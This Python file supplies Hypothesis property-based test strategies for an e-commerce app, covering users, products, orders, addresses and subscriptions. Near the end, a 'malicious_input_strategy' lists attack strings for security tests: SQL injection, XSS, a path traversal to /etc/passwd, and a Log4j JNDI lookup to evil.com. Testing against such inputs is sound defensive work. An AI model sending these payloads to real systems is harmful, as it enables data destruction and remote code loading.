"""Hypothesis strategies for property-based testing"""
from hypothesis import strategies as st
from hypothesis.strategies import composite
from decimal import Decimal
from datetime import datetime, date, timedelta
from app.models.enums import (
    UserRole, OrderStatus, PaymentStatus, SubscriptionStatus, SubscriptionFrequency
)


# Basic strategies
@composite
def email_strategy(draw):
    """Generate valid email addresses"""
    username = draw(st.text(
        alphabet=st.characters(whitelist_categories=('Ll', 'Nd')),
        min_size=3,
        max_size=20
    ))
    domain = draw(st.sampled_from(['example.com', 'test.com', 'demo.org']))
    return f"{username}@{domain}"


@composite
def phone_strategy(draw):
    """Generate valid Indian phone numbers"""
    number = draw(st.integers(min_value=6000000000, max_value=9999999999))
    return f"+91{number}"


@composite
def price_strategy(draw):
    """Generate valid price values (positive, max 2 decimal places)"""
    value = draw(st.integers(min_value=1, max_value=100000))
    cents = draw(st.integers(min_value=0, max_value=99))
    return Decimal(f"{value}.{cents:02d}")


@composite
def stock_quantity_strategy(draw):
    """Generate valid stock quantities (non-negative integers)"""
    return draw(st.integers(min_value=0, max_value=10000))


@composite
def sku_strategy(draw):
    """Generate valid SKU codes"""
    prefix = draw(st.sampled_from(['SKU', 'PROD', 'ITEM']))
    number = draw(st.integers(min_value=1000, max_value=9999))
    return f"{prefix}-{number}"


# Model strategies
@composite
def user_data_strategy(draw, role=None):
    """Generate user data"""
    return {
        'email': draw(email_strategy()),
        'phone': draw(phone_strategy()),
        'name': draw(st.text(min_size=3, max_size=50)),
        'role': role or draw(st.sampled_from(list(UserRole))),
        'is_active': draw(st.booleans()),
        'is_email_verified': draw(st.booleans()),
        'is_phone_verified': draw(st.booleans())
    }


@composite
def product_data_strategy(draw, owner_id=1, category_id=1):
    """Generate product data"""
    consumer_price = draw(price_strategy())
    distributor_price = consumer_price * Decimal('0.8')
    
    return {
        'owner_id': owner_id,
        'title': draw(st.text(min_size=5, max_size=100)),
        'description': draw(st.text(min_size=10, max_size=500)),
        'category_id': category_id,
        'sku': draw(sku_strategy()),
        'unit_size': draw(st.sampled_from(['1 Unit', '500g', '1kg', '1L', '500ml'])),
        'consumer_price': consumer_price,
        'distributor_price': distributor_price,
        'stock_quantity': draw(stock_quantity_strategy()),
        'is_active': draw(st.booleans()),
        'is_subscription_available': draw(st.booleans())
    }


@composite
def cart_item_data_strategy(draw, cart_id=1, product_id=1):
    """Generate cart item data"""
    return {
        'cart_id': cart_id,
        'product_id': product_id,
        'quantity': draw(st.integers(min_value=1, max_value=100)),
        'unit_price': draw(price_strategy())
    }


@composite
def address_data_strategy(draw, user_id=1):
    """Generate address data"""
    return {
        'user_id': user_id,
        'name': draw(st.text(min_size=3, max_size=50)),
        'phone': draw(phone_strategy()),
        'address_line1': draw(st.text(min_size=5, max_size=100)),
        'address_line2': draw(st.text(min_size=0, max_size=100)),
        'city': draw(st.text(min_size=3, max_size=50)),
        'state': draw(st.text(min_size=3, max_size=50)),
        'postal_code': draw(st.text(min_size=6, max_size=6, alphabet=st.characters(whitelist_categories=('Nd',)))),
        'country': 'India',
        'is_default': draw(st.booleans())
    }


@composite
def order_data_strategy(draw, user_id=1, address_id=1):
    """Generate order data"""
    total = draw(price_strategy())
    discount = draw(st.integers(min_value=0, max_value=int(total)))
    
    return {
        'user_id': user_id,
        'order_number': f"ORD-{datetime.now().strftime('%Y%m%d')}-{draw(st.integers(min_value=1000, max_value=9999))}",
        'total_amount': total,
        'discount_amount': Decimal(str(discount)),
        'final_amount': total - Decimal(str(discount)),
        'payment_status': draw(st.sampled_from(list(PaymentStatus))),
        'order_status': draw(st.sampled_from(list(OrderStatus))),
        'delivery_address_id': address_id
    }


@composite
def subscription_data_strategy(draw, user_id=1, product_id=1, address_id=1):
    """Generate subscription data"""
    start = date.today() + timedelta(days=draw(st.integers(min_value=0, max_value=30)))
    
    return {
        'user_id': user_id,
        'product_id': product_id,
        'razorpay_subscription_id': f"sub_{draw(st.text(min_size=12, max_size=12, alphabet=st.characters(whitelist_categories=('Ll', 'Nd'))))}",
        'plan_frequency': draw(st.sampled_from(list(SubscriptionFrequency))),
        'start_date': start,
        'next_delivery_date': start,
        'delivery_address_id': address_id,
        'status': draw(st.sampled_from(list(SubscriptionStatus)))
    }


# Validation strategies
@composite
def invalid_email_strategy(draw):
    """Generate invalid email addresses"""
    return draw(st.sampled_from([
        'notanemail',
        '@example.com',
        'user@',
        'user @example.com',
        'user@.com',
        ''
    ]))


@composite
def invalid_phone_strategy(draw):
    """Generate invalid phone numbers"""
    return draw(st.sampled_from([
        '123',  # Too short
        'abcdefghij',  # Not numeric
        '+1234567890',  # Wrong country code
        '9876543210',  # Missing country code
        ''
    ]))


@composite
def invalid_price_strategy(draw):
    """Generate invalid price values"""
    return draw(st.sampled_from([
        Decimal('-10.00'),  # Negative
        Decimal('0.00'),  # Zero
        Decimal('10.123'),  # More than 2 decimal places
    ]))


@composite
def malicious_input_strategy(draw):
    """Generate malicious input patterns for security testing"""
    return draw(st.sampled_from([
        "'; DROP TABLE users; --",  # SQL injection
        "<script>alert('XSS')</script>",  # XSS
        "' OR '1'='1",  # SQL injection
        "../../../etc/passwd",  # Path traversal
        "${jndi:ldap://evil.com/a}",  # Log4j injection
    ]))


# Hypothesis settings for property tests
def hypothesis_settings():
    """Common Hypothesis settings for property tests"""
    from hypothesis import settings, Phase
    return settings(
        max_examples=100,  # Run 100 iterations as specified in design
        phases=[Phase.explicit, Phase.reuse, Phase.generate, Phase.target],
        deadline=None,  # Disable deadline for async tests
    )
